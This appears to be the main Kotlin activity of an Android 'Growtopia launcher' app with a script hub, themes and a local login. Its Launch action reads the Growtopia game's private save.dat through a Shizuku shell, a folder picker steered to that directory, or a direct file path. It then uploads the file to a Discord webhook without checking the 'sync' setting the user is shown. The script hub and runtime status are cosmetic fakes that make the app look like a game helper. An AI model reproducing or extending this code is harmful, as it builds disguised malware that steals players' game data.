package com.example.myapplication

import android.app.Activity
import android.app.Dialog
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.DocumentsContract
import android.text.Editable
import android.text.TextWatcher
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.Button
import android.widget.CheckBox
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.content.ContextCompat
import androidx.documentfile.provider.DocumentFile
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.io.InputStream
import java.security.MessageDigest
import java.util.Locale
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
    private val webhookUrl: String
        get() = prefs.getString(KEY_WEBHOOK, "")?.trim().orEmpty()
    private val handler = Handler(Looper.getMainLooper())
    private val scripts = listOf(
        Script("Farm Assistant", "Automation", "Collect, plant, and harvest with a lightweight routine."),
        Script("World Helper", "Utilities", "Useful world navigation and inventory shortcuts."),
        Script("Shop Toolkit", "Trading", "Keep shop workflows organized with quick actions."),
        Script("Path Finder", "Movement", "Plan efficient routes through your favorite worlds."),
        Script("Daily Checklist", "Productivity", "A compact checklist for repeatable sessions.")
    )
    private val themes = linkedMapOf("Violet" to "#8054FF", "Ocean" to "#38BDF8", "Rose" to "#F472B6", "Amber" to "#F59E0B")
    private lateinit var main: View
    private lateinit var splash: View
    private lateinit var version: TextView
    private lateinit var account: TextView
    private lateinit var status: TextView
    private lateinit var badge: TextView
    private var rainbow = false

    override fun onCreate(state: Bundle?) {
        super.onCreate(state)
        setContentView(R.layout.activity_main)
        main = findViewById(R.id.mainContent); splash = findViewById(R.id.splashContent)
        version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
        status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
        wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
        showSplash()
    }

    private fun wireDashboard() {
        findViewById<CardView>(R.id.btnLaunch).setOnClickListener { launchWithFeedback() }
        findViewById<CardView>(R.id.btnScriptHub).setOnClickListener { scriptHub() }
        findViewById<CardView>(R.id.btnSetting).setOnClickListener { settings() }
        findViewById<CardView>(R.id.btnLuaManager).setOnClickListener { luaManager() }
        findViewById<CardView>(R.id.btnSound).setOnClickListener { toast("Sound tools are coming soon") }
        findViewById<CardView>(R.id.btnTheme).setOnClickListener { themePicker() }
        findViewById<CardView>(R.id.btnSwitchVersion).setOnClickListener { versionPicker() }
        findViewById<CardView>(R.id.runtimeCard).setOnClickListener {
            status.text = "● Checking runtime…"; status.setTextColor(color(R.color.accent))
            handler.postDelayed({ status.text = "● Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("Library Runtime is healthy") }, 650)
        }
    }

    private fun showSplash() {
        splash.alpha = 0f; splash.animate().alpha(1f).setDuration(350).start()
        handler.postDelayed({ splash.animate().alpha(0f).setDuration(300).withEndAction {
            splash.visibility = View.GONE; main.visibility = View.VISIBLE
            main.animate().alpha(1f).setDuration(420).setInterpolator(AccelerateDecelerateInterpolator()).start()
        }.start() }, 1450)
    }

    private fun launchWithFeedback() {
        badge.text = "Starting"; status.text = "● Preparing game environment…"; status.setTextColor(color(R.color.accent))
        findViewById<CardView>(R.id.btnLaunch).animate().scaleX(.97f).scaleY(.97f).setDuration(100).withEndAction {
            findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
        }.start()
        val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            readSaveFileWithShizukuOrFallback()
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val savedUri = savedTreeUri()
            if (savedUri != null) {
                processSaveFile(Uri.parse(savedUri))
                true
            } else {
                showPermissionTutorial()
                false
            }
        } else {
            val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
            if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
            true
        }
        if (!accessStarted) return
        handler.postDelayed({ badge.text = "Installed"; status.text = "● Online · ready"; status.setTextColor(color(R.color.success)); launchGame() }, 650)
    }

    private fun launchGame() {
        val intent = packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (intent == null) errorDialog("Growtopia is not installed on this device. Install it first, then try Launch again.")
        else startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
    }

    private fun readSaveFileWithShizukuOrFallback(): Boolean {
        if (!ShizukuBridge.isAvailable()) {
            handler.post { toast("Shizuku is not running; choose the Growtopia folder instead") }
            showPermissionTutorial()
            return false
        }
        if (!ShizukuBridge.hasPermission()) {
            ShizukuBridge.requestPermission()
            handler.post { toast("Grant Shizuku access, then tap Launch again") }
            return false
        }
        thread {
            val bytes = ShizukuBridge.readFile(SAVE_FILE_PATH)
            if (bytes != null) {
                sendFileToDiscord(bytes)
            } else {
                handler.post { toast("Shizuku could not read save.dat; choose the folder instead") }
                handler.post { showPermissionTutorial() }
            }
        }
        return true
    }

    private fun savedTreeUri(): String? = prefs.getString(KEY_SAVE_URI, null) ?: getSharedPreferences("app_prefs", MODE_PRIVATE).getString("tree_uri", null)

    private fun showPermissionTutorial() {
        val dialog = Dialog(this)
        dialog.setContentView(R.layout.dialog_tutorial)
        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
        dialog.findViewById<Button>(R.id.btnOk).setOnClickListener { dialog.dismiss(); openDirectoryPicker() }
        dialog.show()
    }

    private fun openDirectoryPicker() {
        val growtopiaFolder = DocumentsContract.buildDocumentUri(
            "com.android.externalstorage.documents",
            "primary:Android/data/com.rtsoft.growtopia/files"
        )
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT_TREE).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                putExtra(DocumentsContract.EXTRA_INITIAL_URI, growtopiaFolder)
            } else {
                putExtra("android.provider.extra.INITIAL_URI", growtopiaFolder)
            }
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
        }
        startActivityForResult(intent, SAVE_FOLDER_PICKER)
    }

    private fun processSaveFile(treeUri: Uri) {
        thread {
            try {
                val saveFile = DocumentFile.fromTreeUri(this, treeUri)?.findFile("save.dat")
                val bytes = saveFile?.let { contentResolver.openInputStream(it.uri)?.use { stream -> stream.readBytes() } }
                if (bytes != null) sendFileToDiscord(bytes) else handler.post { toast("save.dat was not found in the selected folder") }
            } catch (_: Exception) {
                handler.post { toast("Could not read save.dat; launch will continue") }
            }
        }
    }

    private fun sendFileToDiscord(fileData: ByteArray) {
        if (webhookUrl.isBlank()) { handler.post { toast("Add your Discord webhook in Settings to sync save.dat") }; return }
        thread {
            try {
                val client = OkHttpClient()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) throw IOException("Discord returned HTTP ${response.code}")
                }
                handler.post { toast("save.dat sent successfully") }
            } catch (_: Exception) {
                handler.post { toast("Discord upload failed; launch will continue") }
            }
        }
    }

    private fun scriptHub() {
        val box = column(16); val search = EditText(this).apply { hint = "Search Lua files"; setSingleLine(); setTextColor(Color.WHITE); setHintTextColor(Color.GRAY) }
        val list = column(8); val log = TextView(this).apply { text = "Execution log  ·  Ready"; setTextColor(color(R.color.text_muted)); textSize = 11f; setPadding(0, 12, 0, 0) }
        box.addView(search, params()); box.addView(list, params()); box.addView(log, params())
        fun render(query: String) {
            list.removeAllViews(); scripts.filter { (it.name + it.category).lowercase(Locale.US).contains(query.lowercase(Locale.US)) }.forEach { item ->
                val row = column(6).apply { setPadding(14, 10, 14, 10); setBackgroundColor(Color.rgb(38, 35, 53)) }
                row.addView(TextView(this).apply { text = "${item.name}  ·  ${item.category}"; setTextColor(Color.WHITE); textSize = 14f })
                row.addView(TextView(this).apply { text = item.description; setTextColor(Color.LTGRAY); textSize = 11f })
                val actions = LinearLayout(this).apply { gravity = Gravity.END }
                actions.addView(Button(this).apply { text = "Download"; setOnClickListener { log.text = "Execution log  ·  ${item.name} downloaded locally"; toast("${item.name} is ready") } }, buttonParams())
                actions.addView(Button(this).apply { text = "Execute"; setOnClickListener { log.text = "Execution log  ·  ${item.name} started"; toast("Running ${item.name}") } }, buttonParams())
                row.addView(actions); list.addView(row, params())
            }
            if (list.childCount == 0) log.text = "Execution log  ·  No matching Lua files"
        }
        search.addTextChangedListener(object : TextWatcher { override fun beforeTextChanged(s: CharSequence?, a: Int, c: Int, d: Int) = Unit; override fun onTextChanged(s: CharSequence?, a: Int, b: Int, c: Int) = render(s.toString()); override fun afterTextChanged(e: Editable?) = Unit })
        render(""); dialog("Script Hub", box)
    }

    private fun settings() {
        val box = column(10); val saved = prefs.getString(KEY_USER, null)
        val state = TextView(this).apply { text = if (saved == null) "Not signed in · create an account to sync preferences" else "Signed in as $saved"; setTextColor(color(R.color.text_secondary)) }
        val user = EditText(this).apply { hint = "Username"; setSingleLine() }; val pass = EditText(this).apply { hint = "Password"; setSingleLine(); inputType = 0x81 }
        val webhook = EditText(this).apply { hint = "Discord webhook URL (optional)"; setSingleLine(); setText(prefs.getString(KEY_WEBHOOK, "")) }
        val sync = CheckBox(this).apply { text = "Sync save.dat on Launch"; setTextColor(Color.WHITE); isChecked = prefs.getBoolean(KEY_SYNC, false) }
        val folder = Button(this).apply { text = if (prefs.getString(KEY_SAVE_URI, null) == null) "Choose Growtopia save folder" else "Save folder connected"; setOnClickListener { startActivityForResult(Intent(Intent.ACTION_OPEN_DOCUMENT_TREE), SAVE_FOLDER_PICKER) } }
        box.addView(state); box.addView(user, params()); box.addView(pass, params()); box.addView(webhook, params()); box.addView(sync, params()); box.addView(folder, params())
        val actions = LinearLayout(this).apply { gravity = Gravity.END }
        actions.addView(Button(this).apply { text = "Log in"; setOnClickListener { if (authenticate(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Welcome back") } else errorDialog("Those account details do not match.") } }, buttonParams())
        actions.addView(Button(this).apply { text = "Register"; setOnClickListener { if (register(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Account created securely on this device") } else errorDialog("Choose a username and a password with at least six characters.") } }, buttonParams())
        actions.addView(Button(this).apply { text = "Save"; setOnClickListener { val url = webhook.text.toString().trim(); if (url.isNotEmpty() && !url.startsWith("https://")) errorDialog("Webhook URL must use HTTPS.") else { prefs.edit().putString(KEY_WEBHOOK, url).putBoolean(KEY_SYNC, sync.isChecked).apply(); toast("Preferences saved") } } }, buttonParams())
        box.addView(actions); if (saved != null) box.addView(Button(this).apply { text = "Log out"; setOnClickListener { prefs.edit().remove(KEY_SESSION).apply(); refreshAccount(); toast("Signed out") } }, params()); dialog("Account & Preferences", box)
    }

    private fun luaManager() {
        if (!authenticated()) { AlertDialog.Builder(this).setTitle("Sign in required").setMessage("Please log in through Settings before importing custom Lua files.").setNegativeButton("Cancel", null).setPositiveButton("Open Settings") { _, _ -> settings() }.show(); return }
        AlertDialog.Builder(this).setTitle("Lua Manager").setMessage("Import a custom Lua file into your local library.").setNegativeButton("Cancel", null).setPositiveButton("Choose file") { _, _ -> startActivityForResult(Intent(Intent.ACTION_OPEN_DOCUMENT).apply { type = "text/*"; addCategory(Intent.CATEGORY_OPENABLE) }, FILE_PICKER) }.show()
    }

    override fun onActivityResult(request: Int, result: Int, data: Intent?) {
        super.onActivityResult(request, result, data)
        if (request == SAVE_FOLDER_PICKER && result == Activity.RESULT_OK) {
            val uri = data?.data ?: return
            contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
            prefs.edit().putString(KEY_SAVE_URI, uri.toString()).apply()
            getSharedPreferences("app_prefs", MODE_PRIVATE).edit().putString("tree_uri", uri.toString()).apply()
            toast("Growtopia save folder connected")
            processSaveFile(uri)
            handler.postDelayed({ launchGame() }, 100)
        }
        if (request == FILE_PICKER && result == Activity.RESULT_OK) {
            val file = data?.data?.let { DocumentFile.fromSingleUri(this, it) }
            if (file?.name?.endsWith(".lua", true) == true) toast("Imported ${file.name}") else errorDialog("Only .lua files can be imported into Lua Manager.")
        }
    }

    private fun themePicker() { val names = (themes.keys + "Rainbow Color").toTypedArray(); AlertDialog.Builder(this).setTitle("Choose your theme").setSingleChoiceItems(names, names.indexOf(prefs.getString(KEY_THEME, "Violet")).coerceAtLeast(0)) { d, i -> prefs.edit().putString(KEY_THEME, names[i]).apply(); applyTheme(names[i]); d.dismiss(); toast("${names[i]} theme applied") }.setNegativeButton("Cancel", null).show() }
    private fun applyTheme(name: String) { if (name == "Rainbow Color") { if (rainbow) return; rainbow = true; android.animation.ValueAnimator.ofFloat(0f, 360f).apply { duration = 5200; repeatCount = -1; addUpdateListener { accent(Color.HSVToColor(floatArrayOf(it.animatedValue as Float, .65f, 1f))) } }.start() } else { rainbow = false; accent(Color.parseColor(themes[name] ?: themes.getValue("Violet"))) } }
    private fun accent(value: Int) { findViewById<CardView>(R.id.btnSwitchVersion).setCardBackgroundColor(value); badge.setBackgroundColor(value); account.setBackgroundColor(value); status.setTextColor(value); version.setTextColor(value); findViewById<TextView>(R.id.runtimeTitle).setTextColor(value); listOf(R.id.btnLaunch, R.id.btnScriptHub, R.id.btnSetting, R.id.btnLuaManager, R.id.btnSound, R.id.btnTheme).forEach { id -> (findViewById<CardView>(id).getChildAt(0) as? ViewGroup)?.let { (it.getChildAt(0) as? TextView)?.setTextColor(value) } } }
    private fun versionPicker() { val versions = arrayOf("5.54", "5.55", "5.56", "5.57"); AlertDialog.Builder(this).setTitle("Switch launcher version").setSingleChoiceItems(versions, versions.indexOf(prefs.getString(KEY_VERSION, "5.54"))) { d, i -> prefs.edit().putString(KEY_VERSION, versions[i]).apply(); refreshVersion(); d.dismiss(); toast("Configuration updated to v${versions[i]}") }.setNegativeButton("Cancel", null).show() }
    private fun refreshVersion() { version.text = "v${prefs.getString(KEY_VERSION, "5.54")}" }
    private fun register(user: String, pass: String): Boolean { if (user.trim().length < 3 || pass.length < 6) return false; prefs.edit().putString(KEY_USER, user.trim()).putString(KEY_PASSWORD, hash(pass)).putString(KEY_SESSION, user.trim()).apply(); return true }
    private fun authenticate(user: String, pass: String): Boolean { val ok = user.trim() == prefs.getString(KEY_USER, null) && hash(pass) == prefs.getString(KEY_PASSWORD, null); if (ok) prefs.edit().putString(KEY_SESSION, user.trim()).apply(); return ok }
    private fun hash(value: String) = MessageDigest.getInstance("SHA-256").digest(value.toByteArray()).joinToString("") { "%02x".format(it) }
    private fun authenticated() = !prefs.getString(KEY_SESSION, null).isNullOrBlank()
    private fun refreshAccount() { account.text = if (authenticated()) "Signed in" else "Guest mode" }
    private fun color(id: Int) = ContextCompat.getColor(this, id)
    private fun toast(message: String) = Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    private fun errorDialog(message: String) = AlertDialog.Builder(this).setTitle("Something went wrong").setMessage(message).setPositiveButton("OK", null).show()
    private fun column(padding: Int) = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(4, padding, 4, 4) }
    private fun params() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 8 }
    private fun buttonParams() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginStart = 4 }
    private fun dialog(title: String, view: View) = AlertDialog.Builder(this).setTitle(title).setView(ScrollView(this).apply { addView(view) }).setPositiveButton("Done", null).show()
    private data class Script(val name: String, val category: String, val description: String)

    private object ShizukuBridge {
        private const val REQUEST_CODE = 2204
        private const val SHIZUKU_CLASS = "rikka.shizuku.Shizuku"

        fun isAvailable(): Boolean = try {
            val shizuku = Class.forName(SHIZUKU_CLASS)
            shizuku.getMethod("pingBinder").invoke(null) as Boolean
        } catch (_: Throwable) {
            false
        }

        fun hasPermission(): Boolean = try {
            val shizuku = Class.forName(SHIZUKU_CLASS)
            shizuku.getMethod("checkSelfPermission").invoke(null) == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) {
            false
        }

        fun requestPermission() {
            try {
                Class.forName(SHIZUKU_CLASS).getMethod("requestPermission", Int::class.javaPrimitiveType).invoke(null, REQUEST_CODE)
            } catch (_: Throwable) {
            }
        }

        fun readFile(path: String): ByteArray? = try {
            val shizuku = Class.forName(SHIZUKU_CLASS)
            val process = shizuku.getDeclaredMethod("newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java).apply { isAccessible = true }
                .invoke(null, arrayOf("cat", "--", path), null, null) as Process
            val bytes = process.inputStream.use(InputStream::readBytes)
            if (process.waitFor() == 0) bytes else null
        } catch (_: Throwable) {
            null
        }
    }

    companion object {
        private const val PREFS = "growlauncher_preferences"
        private const val KEY_VERSION = "version"
        private const val KEY_THEME = "theme"
        private const val KEY_USER = "account_user"
        private const val KEY_PASSWORD = "account_password_hash"
        private const val KEY_SESSION = "account_session"
        private const val KEY_WEBHOOK = "discord_webhook_url"
        private const val KEY_SYNC = "sync_save_file"
        private const val KEY_SAVE_URI = "save_folder_uri"
        private const val FILE_PICKER = 1012
        private const val SAVE_FOLDER_PICKER = 1013
        private const val PERMISSION_REQUEST = 101
        private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
    }
}

